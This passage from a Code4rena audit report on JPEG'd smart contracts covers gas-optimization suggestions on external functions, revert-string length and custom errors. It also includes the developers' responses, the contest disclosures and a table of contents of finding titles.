class=\"mtk12\">STRATEGIST_ROLE</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;STRATEGIST_ROLE&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Controller</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">15</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">STRATEGIST_ROLE</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;STRATEGIST_ROLE&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">FungibleAssetVaultForDAO</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">41</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">WHITELISTED_ROLE</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;WHITELISTED_ROLE&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">71</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">DAO_ROLE</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;DAO_ROLE&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">72</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">LIQUIDATOR_ROLE</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;LIQUIDATOR_ROLE&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">74</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">CUSTOM_NFT_HASH</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;CUSTOM&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h2 id=\"g-41-public-functions-to-external\" style=\"position:relative;\"><a href=\"#g-41-public-functions-to-external\" aria-label=\"g 41 public functions to external permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-41] Public functions to external</h2>\n<p>The following functions could be set external to save gas and improve code quality.\nExternal call cost is less expensive than of public functions.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"90\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\">,</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk12\">should</span><span class=\"mtk1\"> </span><span class=\"mtk12\">be</span><span class=\"mtk1\"> </span><span class=\"mtk12\">declared</span><span class=\"mtk1\"> external:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> - </span><span class=\"mtk12\">Controller</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\">,</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) (</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Controller</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">#</span><span class=\"mtk7\">151</span><span class=\"mtk1\">-</span><span class=\"mtk7\">154</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">setFarmingPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) </span><span class=\"mtk12\">should</span><span class=\"mtk1\"> </span><span class=\"mtk12\">be</span><span class=\"mtk1\"> </span><span class=\"mtk12\">declared</span><span class=\"mtk1\"> external:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> - </span><span class=\"mtk12\">YVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setFarmingPool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">) (</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">yVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">#</span><span class=\"mtk7\">115</span><span class=\"mtk1\">-</span><span class=\"mtk7\">118</span><span class=\"mtk1\">)</span></span></span></code></pre>\n<h2 id=\"g-42-reduce-the-size-of-error-messages-long-revert-strings\" style=\"position:relative;\"><a href=\"#g-42-reduce-the-size-of-error-messages-long-revert-strings\" aria-label=\"g 42 reduce the size of error messages long revert strings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-42] Reduce the size of error messages (Long revert Strings)</h2>\n<p>Shortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition is met.</p>\n<p>Revert strings that are longer than 32 bytes require at least one additional mstore, along with additional overhead for computing memory offset, etc.</p>\n<p>Revert strings > 32 bytes:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"91\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">tokens</span><span class=\"mtk1\">/</span><span class=\"mtk12\">JPEG</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">23</span><span class=\"mtk1\">:            </span><span class=\"mtk8\">&quot;JPEG: must have minter role to mint&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">tokens</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StableCoin</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">41</span><span class=\"mtk1\">:            </span><span class=\"mtk8\">&quot;StableCoin: must have minter role to mint&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">tokens</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StableCoin</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">55</span><span class=\"mtk1\">:            </span><span class=\"mtk8\">&quot;StableCoin: must have pauser role to pause&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">tokens</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StableCoin</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">69</span><span class=\"mtk1\">:            </span><span class=\"mtk8\">&quot;StableCoin: must have pauser role to unpause&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">vaults</span><span class=\"mtk1\">/</span><span class=\"mtk12\">NFTVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">394</span><span class=\"mtk1\">:            </span><span class=\"mtk8\">&quot;credit_rate_exceeds_or_equals_liquidation_rate&quot;</span><span class=\"mtk1\"> </span></span></span></code></pre>\n<p>I suggest shortening the revert strings to fit in 32 bytes, or using custom errors as described next.</p>\n<h2 id=\"g-43-use-custom-errors-instead-of-revert-strings-to-save-gas\" style=\"position:relative;\"><a href=\"#g-43-use-custom-errors-instead-of-revert-strings-to-save-gas\" aria-label=\"g 43 use custom errors instead of revert strings to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-43] Use Custom Errors instead of Revert Strings to save Gas</h2>\n<p>Custom errors from Solidity 0.8.4 are cheaper than revert strings (cheaper deployment cost and runtime cost when the revert condition is met)</p>\n<p>Source: <a href=\"https://blog.soliditylang.org/2021/04/21/custom-errors/\">https://blog.soliditylang.org/2021/04/21/custom-errors/</a>:</p>\n<blockquote>\n<p>Starting from <a href=\"https://github.com/ethereum/solidity/releases/tag/v0.8.4\">Solidity v0.8.4</a>, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors. Until now, you could already use strings to give more information about failures (e.g., <code>revert(\"Insufficient funds.\");</code>), but they are rather expensive, especially when it comes to deploy cost, and it is difficult to use dynamic information in them.</p>\n</blockquote>\n<p>Custom errors are defined using the <code>error</code> statement, which can be used inside and outside of contracts (including interfaces and libraries).</p>\n<p>See <a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/121\">original submission</a> for instances.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/121#issuecomment-1098310851\">spaghettieth (JPEG’d) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Very high quality report, may implement some of your suggestions. Thank you!</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-04-jpegd-findings/issues/121#issuecomment-1105050319\">spaghettieth (JPEG’d) resolved and commented</a>:</strong></p>\n<blockquote>\n<p>Implemented most of your suggestions in <a href=\"https://github.com/jpegd/core/pull/21\">jpegd/core#21</a>. Custom errors have not been implemented as it would be too big of a change at this point and doing it properly may cause unexpected behaviour/bugs due to the codebase changing too much.</p>\n</blockquote>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-9\">High Risk Findings (9)</a></p>\n<ul>\n<li><a href=\"#h-01-yvault-first-depositor-can-break-minting-of-shares\">[H-01] yVault: First depositor can break minting of shares</a></li>\n<li><a href=\"#h-02-existing-users-locked-jpeg-could-be-overwritten-by-new-user-causing-permanent-loss-of-jpeg-funds\">[H-02] Existing user’s locked JPEG could be overwritten by new user, causing permanent loss of JPEG funds</a></li>\n<li><a href=\"#h-03-update-initializer-modifier-to-prevent-reentrancy-during-initialization\">[H-03] Update initializer modifier to prevent reentrancy during initialization</a></li>\n<li><a href=\"#h-04-reentrancy-issue-in-yvaultdeposit\">[H-04] Reentrancy issue in <code>yVault.deposit</code></a></li>\n<li><a href=\"#h-05-yvaultlpfarming-no-guarantee-jpeg-currentbalance--previousbalance\">[H-05] <code>yVaultLPFarming</code>: No guarantee JPEG currentBalance > previousBalance</a></li>\n<li><a href=\"#h-06-setting-new-controller-can-break-yvaultlpfarming\">[H-06] Setting new controller can break <code>YVaultLPFarming</code></a></li>\n<li><a href=\"#h-07-controller-strategy-migration-will-fail\">[H-07] Controller: Strategy migration will fail</a></li>\n<li><a href=\"#h-08-strategypusdconvexbalanceofjpeg-uses-incorrect-function-signature-while-calling-extrarewardearned-causing-the-function-to-unexpectedly-revert-everytime\">[H-08] <code>StrategyPUSDConvex.balanceOfJPEG</code> uses incorrect function signature while calling <code>extraReward.earned</code>, causing the function to unexpectedly revert everytime</a></li>\n<li><a href=\"#h-09-bad-debts-should-not-continue-to-accrue-interest\">[H-09] Bad debts should not continue to accrue interest</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-11\">Medium Risk Findings (11)</a></p>\n<ul>\n<li><a href=\"#m-01-when-_lptoken-is-jpeg-reward-calculation-is-incorrect\">[M-01] When _lpToken is jpeg, reward calculation is incorrect</a></li>\n<li><a href=\"#m-02-nfthelper-contract-allows-owner-to-burn-nfts\">[M-02] NFTHelper Contract Allows Owner to Burn NFTs</a></li>\n<li><a href=\"#m-03-reward-will-be-locked-in-the-farm-if-no-lp-join-the-pool-at-epochstartblock-\">[M-03] reward will be locked in the farm if no LP join the pool at epoch.startBlock </a></li>\n<li><a href=\"#m-04-setdebtinterestapr-should-accrue-debt-first\">[M-04] <code>setDebtInterestApr</code> should accrue debt first</a></li>\n<li><a href=\"#m-05-rewards-will-be-locked-if-user-transfer-directly-to-pool-without-using-deposit-function-\">[M-05] Rewards will be locked if user transfer directly to pool without using deposit function </a></li>\n<li><a href=\"#m-06-oracle-data-feed-is-insufficiently-validated\">[M-06] Oracle data feed is insufficiently validated.</a></li>\n<li><a href=\"#m-07-wrong-calculation-for-yvault-price-per-share-if-decimals--18\">[M-07] Wrong calculation for <code>yVault</code> price per share if decimals != 18</a></li>\n<li><a href=\"#m-08-_swapuniswapv2-may-use-an-improper-path-which-can-cause-a-loss-of-the-majority-of-the-rewardtokens\">[M-08] <code>_swapUniswapV2</code> may use an improper <code>path</code> which can cause a loss of the majority of the rewardTokens</a></li>\n<li><a href=\"#m-09-the-nocontract-modifier-does-not-work-as-expected\">[M-09] The noContract modifier does not work as expected.</a></li>\n<li><a href=\"#m-10-chainlink-pricer-is-using-a-deprecated-api\">[M-10] Chainlink pricer is using a deprecated API</a></li>\n<li><a href=\"#m-11-division-before-multiplication-may-result-in-no-interest-being-accrued\">[M-11] Division before Multiplication May Result In No Interest Being Accrued</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#codebase-impressions--summary\">Codebase Impressions &#x26; Summary</a></li>\n<li><a href=\"#l-01-add-constructor-initializers\">[L-01] Add constructor initializers</a></li>\n<li><a href=\"#l-02-immutable-addresses-should-be-0-checked\">[L-02] Immutable addresses should be 0-checked</a></li>\n<li><a href=\"#l-03-unbounded-loop-on-array-can-lead-to-dos\">[L-03] Unbounded loop on array can lead to DoS</a></li>\n<li><a href=\"#l-04-add-a-timelock-and-event-to-critical-functions\">[L-04] Add a timelock and event to critical functions</a></li>\n<li><a href=\"#l-05-fee-in-strategypusdconvexsetperformancefee-should-be-upper-bounded\">[L-05] Fee in <code>StrategyPUSDConvex.setPerformanceFee()</code> should be upper-bounded</a></li>\n<li><a href=\"#l-06-fee-in-nftvaultsetorganizationfeerateshould-be-upper-bounded\">[L-06] Fee in <code>NFTVault.setOrganizationFeeRate()</code>should be upper-bounded</a></li>\n<li><a href=\"#l-07-a-magical-number-should-be-documented-and-explained-1e36-use-a-constant-instead\">[L-07] A magical number should be documented and explained: <code>1e36</code>. Use a constant instead</a></li>\n<li><a href=\"#n-01-avoid-floating-pragmas-the-version-should-be-locked-preferably-at--084\">[N-01] Avoid floating pragmas: the version should be locked (preferably at >= <code>0.8.4</code>)</a></li>\n<li><a href=\"#n-02-related-data-should-be-grouped-in-a-struct\">[N-02] Related data should be grouped in a struct</a></li>\n<li><a href=\"#n-03-unused-named-returns\">[N-03] Unused named returns</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#table-of-contents\">Table of Contents</a></li>\n<li><a href=\"#g-01-nftescrow_executetransfer-cheap-contract-deployment-through-clones\">G-01 <code>NFTEscrow._executeTransfer()</code>: Cheap Contract Deployment Through Clones</a></li>\n<li><a href=\"#g-02-lpfarmingnewepoch-l128-and-l133-should-be-unchecked-due-to-parent-ifelse-condition\">G-02 <code>LPFarming.newEpoch()</code>: L128 and L133 should be unchecked due to parent if/else condition</a></li>\n<li><a href=\"#g-03-lpfarmingwithdraw-l248-should-be-unchecked-due-to-l243\">G-03 <code>LPFarming.withdraw()</code>: L248 should be unchecked due to L243</a></li>\n<li><a href=\"#g-04-lpfarming_withdrawreward-poolinfo_pidaccrewardpershare-should-get-cached\">G-04 <code>LPFarming._withdrawReward()</code>: <code>poolInfo[_pid].accRewardPerShare</code> should get cached</a></li>\n<li><a href=\"#g-05-yvaultlpfarmingwithdraw-l124-should-be-unchecked-due-to-l119\">G-05 <code>yVaultLPFarming.withdraw()</code>: L124 should be unchecked due to L119</a></li>\n<li><a href=\"#g-06-yvaultlpfarming_withdrawreward-accrewardpershare-should-get-cached\">G-06 <code>yVaultLPFarming._withdrawReward()</code>: <code>accRewardPerShare</code> should get cached</a></li>\n<li><a href=\"#g-07-jpeglockunlock-use-storage-instead-of-copying-struct-in-memory-l69\">G-07 <code>JPEGLock.unlock()</code>: use <code>storage</code> instead of copying struct in memory L69</a></li>\n<li><a href=\"#g-08-fungibleassetvaultfordao_collateralpriceusd-oracle-should-get-cached\">G-08 <code>FungibleAssetVaultForDAO._collateralPriceUsd()</code>: <code>oracle</code> should get cached</a></li>\n<li><a href=\"#g-09-fungibleassetvaultfordao_collateralpriceusd-return-statement-should-be-unchecked\">G-09 <code>FungibleAssetVaultForDAO._collateralPriceUsd()</code>: return statement should be unchecked</a></li>\n<li><a href=\"#g-10-fungibleassetvaultfordaodeposit-collateralasset-should-get-cached\">G-10 <code>FungibleAssetVaultForDAO.deposit()</code>: <code>collateralAsset</code> should get cached</a></li>\n<li><a href=\"#g-11-fungibleassetvaultfordaorepay-l184-should-be-unchecked-due-to-l182\">G-11 <code>FungibleAssetVaultForDAO.repay)</code>: L184 should be unchecked due to L182</a></li>\n<li><a href=\"#g-12-fungibleassetvaultfordaowithdraw-l196-should-be-unchecked-due-to-l194\">G-12 <code>FungibleAssetVaultForDAO.withdraw()</code>: L196 should be unchecked due to L194</a></li>\n<li><a href=\"#g-13-fungibleassetvaultfordaowithdraw-collateralamount-should-get-cached\">G-13 <code>FungibleAssetVaultForDAO.withdraw()</code>: <code>collateralAmount</code> should get cached</a></li>\n<li><a href=\"#g-14-nftvault_normalizeaggregatoranswer-return-statement-should-be-unchecked\">G-14 <code>NFTVault._normalizeAggregatorAnswer()</code>: return statement should be unchecked</a></li>\n<li><a href=\"#g-15-nftvault_calculateadditionalinterest-totaldebtamount-should-get-cached\">G-15 <code>NFTVault._calculateAdditionalInterest()</code>: <code>totalDebtAmount</code> should get cached</a></li>\n<li><a href=\"#g-16-nftvaultsol-struct-positionpreview-can-be-tightly-packed-to-save-1-storage-slot\">G-16 <code>NFTVault.sol</code>: <code>struct PositionPreview</code> can be tightly packed to save 1 storage slot</a></li>\n<li><a href=\"#g-17-nftvaultshowposition-l659-should-be-unchecked-due-to-l649\">G-17 <code>NFTVault.showPosition()</code>: L659 should be unchecked due to L649</a></li>\n<li><a href=\"#g-18-nftvaultshowposition-positions_nftindexliquidatedat-should-get-cached\">G-18 <code>NFTVault.showPosition()</code>: <code>positions[_nftIndex].liquidatedAt</code> should get cached</a></li>\n<li><a href=\"#g-19-nftvaultshowposition-help-the-optimizer-by-saving-a-storage-variables-reference-instead-of-repeatedly-fetching-it-positions_nftindex\">G-19 <code>NFTVault.showPosition()</code>: Help the optimizer by saving a storage variable’s reference instead of repeatedly fetching it (<code>positions[_nftIndex]</code>)</a></li>\n<li><a href=\"#g-20-nftvaultborrow-totaldebtportion-should-get-cached\">G-20 <code>NFTVault.borrow()</code>: <code>totalDebtPortion</code> should get cached</a></li>\n<li><a href=\"#g-21-nftvaultrepay-l781-should-be-unchecked-due-to-ternary-operator\">G-21 <code>NFTVault.repay()</code>: L781 should be unchecked due to ternary operator</a></li>\n<li><a href=\"#g-22-nftvaultrepay-totaldebtportion-and-totaldebtamount-should-get-cached\">G-22 <code>NFTVault.repay()</code>: <code>totalDebtPortion</code> and <code>totalDebtAmount</code> should get cached</a></li>\n<li><a href=\"#g-23-controllersetstrategy-boolean-comparison-l87\">G-23 <code>Controller.setStrategy()</code>: boolean comparison L87</a></li>\n<li><a href=\"#g-24-strategypusdconvexbalanceofjpeg-jpeg-should-get-cached\">G-24 <code>StrategyPUSDConvex.balanceOfJPEG()</code>: <code>jpeg</code> should get cached</a></li>\n<li><a href=\"#g-25-strategypusdconvexbalanceofjpeg-use-a-return-statement-instead-of-break\">G-25 <code>StrategyPUSDConvex.balanceOfJPEG()</code>: use a <code>return</code> statement instead of <code>break</code></a></li>\n<li><a href=\"#g-26-strategypusdconvexwithdraw-l281-should-be-unchecked-due-to-l279\">G-26 <code>StrategyPUSDConvex.withdraw()</code>: L281 should be unchecked due to L279</a></li>\n<li><a href=\"#g-27-strategypusdconvexharvest-l362-should-be-unchecked-due-to-l359-l360-and-how-performancefee-is-set-l183\">G-27 <code>StrategyPUSDConvex.harvest()</code>: L362 should be unchecked due to L359-L360 and how performanceFee is set L183</a></li>\n<li><a href=\"#g-28-yvaultearn-token-and-controller-should-get-cached\">G-28 <code>yVault.earn()</code>: <code>token</code> and <code>controller</code> should get cached</a></li>\n<li><a href=\"#g-29-yvaultwithdraw-l178-should-be-unchecked-due-to-l177\">G-29 <code>yVault.withdraw()</code>: L178 should be unchecked due to L177</a></li>\n<li><a href=\"#g-30-yvaultwithdraw-token-should-get-cached\">G-30 <code>yVault.withdraw()</code>: <code>token</code> should get cached</a></li>\n<li><a 